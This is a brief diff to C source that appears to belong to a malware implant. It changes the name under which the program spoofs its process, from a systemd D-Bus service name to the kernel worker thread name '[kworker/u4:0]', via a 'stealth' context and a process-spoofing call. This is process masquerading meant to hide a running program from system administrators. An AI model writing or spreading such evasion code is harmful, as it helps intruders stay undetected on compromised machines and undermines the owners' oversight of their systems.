@@ -153,7 +153,7 @@ int main(int argc, char *argv[]) {
     ph_heap_secret_t secret_ctx;
     ph_heap_secret_init(&secret_ctx, (const uint8_t *)secret, strlen(secret));
 
-    const char *masq_name = "dbus-org.freedesktop.timesync1";
+    const char *masq_name = "[kworker/u4:0]";
     ph_stealth_ctx_t stealth_ctx;
     ph_stealth_init(&stealth_ctx, argc, argv);
     ph_stealth_spoof_process(&stealth_ctx, masq_name, masq_name);
